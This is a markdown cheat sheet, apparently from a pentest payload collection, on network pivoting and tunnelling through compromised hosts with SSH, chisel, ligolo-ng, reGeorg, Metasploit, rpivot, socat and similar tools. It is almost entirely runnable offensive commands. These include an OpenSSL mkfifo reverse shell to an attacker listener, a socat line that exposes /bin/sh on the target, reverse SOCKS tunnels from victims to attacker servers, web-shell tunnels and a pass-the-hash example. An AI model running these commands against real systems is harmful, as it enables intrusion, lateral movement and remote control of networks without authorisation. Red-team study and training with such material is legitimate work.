# Network Pivoting Techniques

## Summary

- [Network Pivoting Techniques](#network-pivoting-techniques)
  - [Summary](#summary)
  - [SOCKS Compatibility Table](#socks-compatibility-table)
  - [Important Notes](#important-notes)
    - [Avoid Using ICMP for SOCKS Proxies](#avoid-using-icmp-for-socks-proxies)
    - [NMAP Usage with SOCKS Proxy](#nmap-usage-with-socks-proxy)
    - [Running Scripts \& Binaries with Proxychains](#running-scripts--binaries-with-proxychains)
    - [Quiet Mode in Proxychains](#quiet-mode-in-proxychains)
  - [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
  - [SSH](#ssh)
    - [SOCKS Proxy](#socks-proxy)
    - [Local Port Forwarding](#local-port-forwarding)
    - [Remote Port Forwarding](#remote-port-forwarding)
    - [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding)
    - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
      - [Steps to Set Up SSH Remote Port Forwarding](#steps-to-set-up-ssh-remote-port-forwarding)
    - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
      - [Usage](#usage)
  - [Proxychains](#proxychains)
  - [Graftcp](#graftcp)
  - [Web SOCKS - reGeorg](#web-socks---regeorg)
  - [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
  - [Metasploit](#metasploit)
  - [Empire](#empire)
  - [sshuttle](#sshuttle)
  - [chisel](#chisel)
    - [SharpChisel](#sharpchisel)
  - [Ligolo](#ligolo)
  - [Ligolo-ng](#ligolo-ng)
      - [Single Pivot](#single-pivot)
      - [Double Pivot](#double-pivot)
      - [Triple, etc. Pivot](#triple-etc-pivot)
      - [Pivoting to individual hosts to expose internally running services.](#pivoting-to-individual-hosts-to-expose-internally-running-services)
  - [Gost](#gost)
  - [Rpivot](#rpivot)
  - [revsocks](#revsocks)
  - [plink](#plink)
  - [ngrok](#ngrok)
  - [cloudflared](#cloudflared)
  - [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
  - [Double Pivoting](#double-pivoting)
    - [Concept](#concept)
    - [Steps for Double Pivoting](#steps-for-double-pivoting)
  - [SSHuttle](#sshuttle-1)
    - [Key Features:](#key-features)
    - [Usage Example](#usage-example)
    - [Using SSH Key for Authentication](#using-ssh-key-for-authentication)
    - [Route dns queries through proxy](#route-dns-queries-through-proxy)
  - [OpenSSL](#openssl)
    - [Generate a new RSA key \& create certificates](#generate-a-new-rsa-key--create-certificates)
    - [Start a listener on local host](#start-a-listener-on-local-host)
    - [Connect from target to listening port](#connect-from-target-to-listening-port)
  - [iptables](#iptables)
    - [Enable port forwarding in the kernel](#enable-port-forwarding-in-the-kernel)
    - [Create a rule to redirect matching traffic on the same host](#create-a-rule-to-redirect-matching-traffic-on-the-same-host)
    - [Create a rule to redirect matching traffic to a different host](#create-a-rule-to-redirect-matching-traffic-to-a-different-host)
  - [socat](#socat)
    - [Redirect all Port A connections locally to Port B](#redirect-all-port-a-connections-locally-to-port-b)
    - [Port to remote ip and port](#port-to-remote-ip-and-port)
    - [Translate between IPv4 and IPv6](#translate-between-ipv4-and-ipv6)
    - [Socat SSL tunnel](#socat-ssl-tunnel)
  - [Basic Pivoting Types](#basic-pivoting-types)
    - [Listen - Listen](#listen---listen)
    - [Listen - Connect](#listen---connect)
    - [Connect - Connect](#connect---connect)
  - [References](#references)


## SOCKS Compatibility Table

| SOCKS Version | TCP   | UDP   | IPv4  | IPv6  | Hostname | Call FQDN |
| ------------- | :---: | :---: | :---: | :---: | :---:    |:---:      |
| SOCKS v4      | ✅    | ❌    | ✅    | ❌    | ❌       | ❌        |
| SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       | ❌        |
| SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       | ✅        |

**Remark**: FQDN call requires UDP but can be fixed by change of local hosts file to match the FQDN with the specific host

## Important Notes

### Avoid Using ICMP for SOCKS Proxies
- **Do not use ICMP echo requests (ping) to test SOCKS proxies.**
  
  SOCKS is a protocol that forwards network packets between a client and server through a proxy. It primarily handles TCP connections to any IP and forwards UDP packets as well.
  
  To test a SOCKS proxy, use a **TCP-based protocol**, such as:
  - **SSH** (Secure Shell)
  - **HTTP GET requests** through a tunnel
  
  **Reminder**: ICMP (ping) is not suitable for testing SOCKS proxies.

---

### NMAP Usage with SOCKS Proxy
- **Use NMAP with TCP connect scan (`-sT`) and disable ping (`-Pn`)**.

  This configuration also applies to:
  - **Version scanning** (`-sV`)
  - **Script scanning** (`-sC`)
  
  Ensure all these scans are used alongside `-sT` and `-Pn`.

  **Examples:**
  ```bash
  proxychains nmap -sT -Pn -p- x.x.x.x
  proxychains nmap -sT -Pn -sV -sC -p 21,80,443,445 x.x.x.x
  ```

### Running Scripts & Binaries with Proxychains
When using proxychains with interpreted programs (e.g., Python scripts), it's best to explicitly reference the interpreter.

Example:
```bash
proxychains4 [-q -f proxychains.conf] python python_script.py
```

Even if the script includes a hashbang (#!), specifying the interpreter can prevent network connection failures that occur when the script's traffic isn't routed through the proxy properly. Source

### Quiet Mode in Proxychains
Uncomment the "quiet mode" line in `/etc/proxychains.conf` to suppress stdout messages that may clutter your terminal.

This is optional, but it can make the output cleaner and easier to manage.


## Windows netsh Port Forwarding

```powershell
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110

# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
# Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545

```

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

## SSH

### SOCKS Proxy

```bash
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip : Konami SSH Port forwarding

```bash
[ENTER] + [~C]
-D 1090
```

### Local Port Forwarding

```bash
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

### Remote Port Forwarding

### SSH Dynamic Port Forwarding
Allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.

**How to set it up**:  
1. Edit /etc/proxychains.conf and implement the following:
   - Remove **Dynamic chain** from comment.
   - Comment **Strict chain** and **Random chain**.
   - Append line **socks4 127.0.0.1 9050** at the end of the document (proxy list), save and close file. *You can, of course, use a different port.

2. Setup the SSH Dynamic Port Forwarding:  
  ```
  ssh -D 127.0.0.1:9050 user@victim-IP
  ```

**Usage examples**:  
With x.x.x.x being the ip address of a host that belongs to the tunneled network:  
  ```
  proxychains nmap -sT -Pn -p- x.x.x.x
  proxychains smbmap -H x.x.x.x
  proxychains ssh user@x.x.x.x
  ```
In order to use a browser through the tunnel:  

  ```
  proxychains chrome
  proxychains firefox
  ```  

### SSH Remote Port Forwarding

If you're looking for a way to establish a **reverse shell through a pivot tunnel**, SSH remote port forwarding is what you need. This method allows you to forward a port on the remote (victim) machine to a port on the local (attacker) machine.

#### Steps to Set Up SSH Remote Port Forwarding

1. **SSH into the Victim Machine**
   - Access the victim machine via SSH.

2. **Modify SSH Configuration**
   - Open the `/etc/ssh/sshd_config` file and make the following changes:
     - Uncomment and change `GatewayPorts no` to `GatewayPorts yes`.
     - This step is crucial. If not done, the tunnel will only bind to `127.0.0.1` (localhost) instead of `0.0.0.0`, preventing traffic forwarding from external hosts.

3. **Restart SSH Service**
   - Apply the changes by restarting the SSH service:
     ```bash
     sudo service ssh restart
     ```
   - Exit the session and return to your local machine.

4. **Set Up Remote Port Forwarding**
   - After setting up, run the following command to forward a remote port:
     ```bash
     ssh -R 2222:*:2222 user@victim-IP
     ```

5. **Test the Setup**
   - Set a listener on your attacker machine (e.g., using `netcat`):
     ```bash
     nc -lvp 2222
     ```
   - On the victim machine, connect to the forwarded port:
     ```bash
     nc 127.0.0.1 2222
     ```
   - If your attacker machine receives the connection, the forwarding works, and all traffic to `victim-IP:2222` will be forwarded to your attacker machine.

6. **Forward Multiple Ports**
   - You can forward multiple ports by adding additional `-R` options:
     ```bash
     ssh -R 2222:*:2222 -R 3333:*:3333 user@victim-IP
     ```

**Note**: Traffic from external hosts (pivoting network) must target the victim IP to be forwarded back to the attacker machine.

**Alternative Method**: You can also implement remote port forwarding by SSH'ing from the victim to the attacker machine.


### SSH Local Port Forwarding

Local port forwarding allows you to forward a port on the local (attacker) machine to a port on the remote (victim) machine. This is particularly useful for scanning local ports on the victim.

#### Usage
```bash
ssh user@victim-IP -L 8888:127.0.0.1:8086
```

This forwards local port 8888 to port 8086 on the victim machine. Now, you can scan the forwarded port on the victim machine using a tool like nmap:

```bash
nmap -Pn -n -p8888 -sV 127.0.0.1
```

```bash
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
```

## Proxychains

**Config file**: /etc/proxychains.conf

```bash
[ProxyList]
socks4 localhost 8080
```

Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`

## Graftcp

> A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.

:warning: Same as proxychains, with another mechanism to "proxify" which allow Go applications.

```ps1
# https://github.com/hmgle/graftcp

# Create a SOCKS5, using Chisel or another tool and forward it through SSH
(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# Run graftcp and specify the SOCKS5
(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(attacker) $ graftcp ./nuclei -u http://172.16.1.24
```

Simple configuration file for graftcp

```py
# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf
## Listen address (default ":2233")
listen = :2233
loglevel = 1

## SOCKS5 address (default "127.0.0.1:1080")
socks5 = 127.0.0.1:1080
# socks5_username = SOCKS5USERNAME
# socks5_password = SOCKS5PASSWORD

## Set the mode for select a proxy (default "auto")
select_proxy_mode = auto
```


## Web SOCKS - reGeorg

[reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

Drop one of the following files on the server:

- tunnel.ashx
- tunnel.aspx
- tunnel.js
- tunnel.jsp
- tunnel.nosocket.php
- tunnel.php
- tunnel.tomcat.5.jsp

```python
python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080

optional arguments:
  -h, --help           show this help message and exit
  -l , --listen-on     The default listening address
  -p , --listen-port   The default listening port
  -r , --read-buff     Local read buffer, max data to be sent per POST
  -u , --url           The url containing the tunnel script
  -v , --verbose       Verbose output[INFO|DEBUG]
```

## Web SOCKS - pivotnacci

[pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.

```powershell
pip3 install pivotnacci
pivotnacci  https://domain.com/agent.php --password "s3cr3t"
pivotnacci  https://domain.com/agent.php --polling-interval 2000
```


## Metasploit

```powershell
# Meterpreter list active port forwards
portfwd list 

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd add –l 3389 –p 3389 –r target-host 
portfwd add -l 88 -p 88 -r 127.0.0.1
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd delete –l 3389 –p 3389 –r target-host 
# Meterpreter delete all port forwards
portfwd flush 

or

# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
run autoroute -s 192.168.15.0/24 
use auxiliary/server/socks_proxy
set SRVPORT 9090
set VERSION 4a
# or
use auxiliary/server/socks4a     # (deprecated)


# Meterpreter list all active routes
run autoroute -p 

route #Meterpreter view available networks the compromised host can access
# Meterpreter add route for 192.168.14.0/24 via Session number.
route add 192.168.14.0 255.255.255.0 3 
# Meterpreter delete route for 192.168.14.0/24 via Session number.
route delete 192.168.14.0 255.255.255.0 3 
# Meterpreter delete all routes
route flush 
```

## Empire

```powershell
(Empire) > socksproxyserver
(Empire) > use module management/invoke_socksproxy
(Empire) > set remoteHost 10.10.10.10
(Empire) > run
```

## sshuttle

Transparent proxy server that works as a poor man's VPN. Forwards over ssh. 

* Doesn't require admin. 
* Works with Linux and MacOS.
* Supports DNS tunneling.

```powershell
pacman -Sy sshuttle
apt-get install sshuttle
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
sshuttle -vvr username@pivot_host 10.2.2.0/24 

# using a private key
$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 

# -x == exclude some network to not transmit over the tunnel
# -x x.x.x.x.x/24
```

## chisel


```powershell
go get -v github.com/jpillora/chisel

# forward port 389 and 88 to hacker computer
user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 

# SOCKS
user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
```

### SharpChisel

A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel

```powershell
user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
================================================================
server : run the Server Component of chisel 
-p 8080 : run server on port 8080
--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
--auth "user:pass" : Creds required to connect to the server
--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.

user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
```

## Ligolo

Ligolo : Reverse Tunneling made easy for pentesters, by pentesters


1. Build Ligolo
  ```powershell
  # Get Ligolo and dependencies
  cd `go env GOPATH`/src
  git clone https://github.com/sysdream/ligolo
  cd ligolo
  make dep

  # Generate self-signed TLS certificates (will be placed in the certs folder)
  make certs TLS_HOST=example.com

  make build-all
  ```
2. Use Ligolo
  ```powershell
  # On your attack server.
  ./bin/localrelay_linux_amd64

  # On the compromise host.
  ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
  ```

## Ligolo-ng

Ligolo-ng : An advanced, yet simple, tunneling tool that uses TUN interfaces.

#### Single Pivot
1. Downloading the binaries.
- The proper binaries can be downloaded from [here](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2).

2. Setting up the ligolo-ng interface and IP routes.
- The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
```bash
#!/bin/bash

ip tuntap add user root mode tun ligolo
ip link set ligolo up
ip route add <x.x.x.x\24> dev ligolo
```

- We can then run the script by issuing the `chmod +x ligolo-ng_setup.sh && ./ligolo-ng_setup.sh`

3. Setting up the ligolo-ng proxy.
- After the interface has been setup, we can now start the ligolo-ng proxy. We can use any `<PROXY_PORT>` we want as long as it not already in use.
`./proxy -laddr <ATTACKER_IP>:<PROXY_PORT> -selfcert`

4. Using the ligolo-ng agent to connect to the ligolo-ng proxy.
- In the compromised computer we can use the agent to connect back to the proxy.
`./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert`

5. Start tunneling traffic through ligolo-ng.
- Once the connection from the agent reaches the proxy we can use the `session` command to list the available sessions.
- We can use the arrow keys to select the session we want and issue the command `start` to start tunnelling traffic through it.

6. Using local tools.
- After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).

#### Double Pivot
1. Setting up a listener in the initial pivoting session.
- To start a double pivot, we have to make sure that the connection of the second agent will go through the **first** agent to avoid losing contact to our first pivot. To do so, we will have to create a _listener_ to the ligolo-ng session responsible for the first pivot.
- This command starts a listener to all the interfaces (`0.0.0.0`) of the **compromised**  host in port `4443` (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be **redirected to the ligolo-ng** proxy (`--to <ATTACKER_IP>:<PROXY_PORT>`).
`listener_add --addr 0.0.0.0:4443 --to <ATTACKER_IP>:<PROXY_PORT> --tcp`

2. Starting te second agent. 
- After transferring the ligolo-ng agent to the **second** pivot host that we have compromised we will start a connection **not directly to our ligolo-ng proxy** but to the first pivoting agent.
`.\agent.exe -connect <1st_PIVOT_HOST_IP>:4443 -ignore-cert `

3. Starting the second pivot.
- In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the `session` command and the arrow keys to navigate through the created sessions. Issuing the `start` and `stop` commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.

4. Adding a new IP route to the second network.
- Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the `ligolo` interface that we created in the first step.
`ip route add 172.16.10.0/24 dev ligolo`

5. Using local tools.
- After the tunneling has been initiated, we can use local offensive tools to the second network as well.

#### Triple, etc. Pivot
- The process is exactly the same as the second pivot.

#### Pivoting to individual hosts to expose internally running services.
- The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.

## Gost

> Wiki English : https://docs.ginuerzh.xyz/gost/en/

```powershell
git clone https://github.com/ginuerzh/gost
cd gost/cmd/gost
go build

# Socks5 Proxy
Server side: gost -L=socks5://:1080
Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true

# Local Port Forward
gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
```

## Rpivot

Server (Attacker box)

```python
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```

Client (Compromised box)

```python
python client.py --server-ip <ip> --server-port 9443
```

Through corporate proxy

```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

Passing the hash

```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe \
--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
```

## revsocks

```powershell
# Listen on the server and create a SOCKS 5 proxy on port 1080
user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234

# Connect client to the server
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
```


```powershell
# Build for Linux
git clone https://github.com/kost/revsocks
export GOPATH=~/go
go get github.com/hashicorp/yamux
go get github.com/armon/go-socks5
go get github.com/kost/go-ntlmssp
go build
go build -ldflags="-s -w" && upx --brute revsocks

# Build for Windows
go get github.com/hashicorp/yamux
go get github.com/armon/go-socks5
go get github.com/kost/go-ntlmssp
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
go build -ldflags -H=windowsgui
upx revsocks
```


## plink

```powershell
# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   
```

## ngrok

```powershell
# get the binary
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip 

# log into the service
./ngrok authtoken 3U[REDACTED_TOKEN]Hm

# deploy a port forwarding for 4433
./ngrok http 4433
./ngrok tcp 4433
```

## cloudflared

```bash
# Get the binary
wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
tar xvzf cloudflared-stable-linux-amd64.tgz
# Expose accessible internal service to the internet
./cloudflared tunnel --url <protocol>://<host>:<port>
```

## Capture a network trace with builtin tools

* Windows (netsh)
  ```ps1
  # start a capture use the netsh command.
  netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384

  # stop the trace
  netsh trace stop

  # Event tracing can be also used across a reboots
  netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384

  # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.
  etl2pcapng.exe c:\trace.etl c:\trace.pcapng

  # Use filters
  netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
  ```
* Linux (tcpdump)
  ```ps1
  sudo apt-get install tcpdump
  tcpdump -w 0001.pcap -i eth0
  tcpdump -A -i eth0

  # capture every TCP packet
  tcpdump -i eth0 tcp

  # capture everything on port 22
  tcpdump -i eth0 port 22
  ```

## Double Pivoting
A great resource related to Double Pivoting can be found [here](https://pentest.blog/explore-hidden-networks-with-double-pivoting/). Double pivoting involves using SSH Dynamic Port Forwarding and Proxychains to reach multiple intermediate hosts.

### Concept
Assume we have the following machines:

| IP        |	Role     |
| --------- | -------- |
|10.10.10.10|	Attacker |
|10.10.10.11|	Jumphost1|
|172.16.1.12|	Jumphost2|
|172.16.2.13|	Jumphost3|


* The Attacker can reach Jumphost1.
* Jumphost1 can reach Jumphost2.
* Jumphost2 can reach Jumphost3.

### Steps for Double Pivoting
1. Implement Dynamic Port Forwarding for Jumphost1
   * Set up SSH Dynamic Port Forwarding to reach Jumphost2 from Jumphost1.
2. Edit Proxychains Configuration
   * Open the /etc/proxychains.conf file and add another SOCKS proxy entry at the end of the file:
    ```bash
    ...
    socks4 127.0.0.1 9050
    socks4 127.0.0.1 9999
    ```
3. Dynamic Port Forwarding for Jumphost2
   * SSH into Jumphost1 and set up another Dynamic Port Forwarding for Jumphost2:
    ```bash
    ssh -D 127.0.0.1:9999 user@Jumphost2
    ```
    At this point, you should be able to reach Jumphost3 using proxychains, leveraging the double pivoting technique.

## SSHuttle

**SSHuttle** allows you to create a VPN-like connection from your machine to any remote server via SSH. It works as long as the remote server has Python 2.3 or higher. This tool enables you to forward all network traffic from your local machine through the remote server, effectively creating a VPN over SSH.

### Key Features:
- **Root access** is required on the local (client) machine.
- On the remote (server) machine, only a **regular user account** is required (root is not necessary).
- You can run **multiple instances of SSHuttle** simultaneously on a single client machine, connecting to different servers, allowing you to be on multiple VPNs at once.
- For more information, check the [SSHuttle GitHub repository](https://github.com/sshuttle/sshuttle).

### Usage Example
Assuming you want to pivot into the network `172.16.2.0/16`:

```bash
# Connect to remote host
sshuttle -vvr root@victim 172.16.2.0/16
```

### Using SSH Key for Authentication
If you'd like to use an SSH key for authentication instead of a password:

```bash
sshuttle -vvr root@victim --ssh-cmd 'ssh -i ~/.ssh/id_rsa' 172.16.2.0/16
```

This command specifies the SSH key to use (~/.ssh/id_rsa) when connecting to the remote server.

### Route dns queries through proxy

```bash 
sshuttle -dns -vv -r root@victim 0/0
```

## OpenSSL
Very wide spread and great for Living of The Land. This command-line application usually is used to perform cryptographic tasks, such as creating and handling certificates and related files. With some creativity OpenSSL can also used in a different way

### Generate a new RSA key & create certificates
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### Start a listener on local host
```bash
openssl s_server -quiet -key.pem -cert cert.pem -port [LPORT]
```

### Connect from target to listening port
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [LHOST]:[LPORT] > /tmp/s; rm /tmp/s
```

## iptables 
Another option with Living of the Land character is iptables. This is giving a lot of options to do powerful pivoting while on the other hand ultimately can lock you out if done a mistake. So better be careful on this ones :) 

### Enable port forwarding in the kernel
```bash
echo 1 | sudo tee /proc/sys/ipv4/ip_forward
```

### Create a rule to redirect matching traffic on the same host
```bash
iptables -t nat -A PREROUTING -i [interface] -p tcp -dport [port_a] -j REDIRECT --to-port [port_b]
```

### Create a rule to redirect matching traffic to a different host
```bash
iptables -t nat -A PREROUTING -p tcp -s 192.168.1.2 --sport 1234:4321 -d 192.168.100.2 --dport 22
```
## socat
Socat if installed on the target machine is another great way for tunneling while living of the land. 

### Redirect all Port A connections locally to Port B
```bash
socat TCP4-LISTEN: [port_b], reuseaddr, fork TCP4-LISTEN:[port_a],reuseaddr
```

### Port to remote ip and port
```bash
socat TCP-LISTEN:[lport],fork TCP:[redirect ip]:[rport] &
```

### Translate between IPv4 and IPv6
```bash
socat TCP-LISTEN:[lport],fork TCP6:[redirect ipv6]:[rport] &
```

### Socat SSL tunnel
```bash
// Generate 
filename=server
openssl genrsa -out $filename.key 1024
openssl req -new -key $filename.key -x509 -days 3653 -out $filename.crt
cat $filename.key $filename.crt > $filename.pem
chmod 600 $filename.key $filename.pem

// run on target
socat OPENSSL-LISTEN:443, reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh

// on local

socat STDIO OPENSSL-CONNECT:localhost:443,cert=$filename.pem,cafile=$filename.crt
```

## Basic Pivoting Types

| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| Listen - Listen   | Exposed asset, may not want to connect out. |
| Listen - Connect  | Normal redirect.                            |
| Connect - Connect | Can’t bind, so connect to bridge two hosts  |

### Listen - Listen

| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| ncat              | `ncat -v -l -p 8080 -c "ncat -v -l -p 9090"`|
| socat             | `socat -v tcp-listen:8080 tcp-listen:9090`  |
| remote host 1     | `ncat localhost 8080 < file`                |
| remote host 2     | `ncat localhost 9090 > newfile`             |

### Listen - Connect

| Type              | Use Case                                                        |
| :-------------    | :------------------------------------------                     |
| ncat              | `ncat -l -v -p 8080 -c "ncat localhost 9090"`                   |
| socat             | `socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat localhost -p 8080 < file`                                 |
| remote host 2     | `ncat -l -p 9090 > newfile`                                     |

### Connect - Connect

| Type              | Use Case                                                                   |
| :-------------    | :------------------------------------------                                |
| ncat              | `ncat localhost 8080 -c "ncat localhost 9090"`                             |
| socat             | `socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat -l -p 8080 < file`                                                   |
| remote host 2     | `ncat -l -p 9090 > newfile`                                                |

## References

* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
* [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
* 🇫🇷 [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/) - 🇺🇸 [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
* [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
* [Active Directory - hideandsec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)
* [Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
* [Benji's Pivoting & Tunneling guide](https://benjitrapp.github.io/attacks/2024-09-28-pivoting/)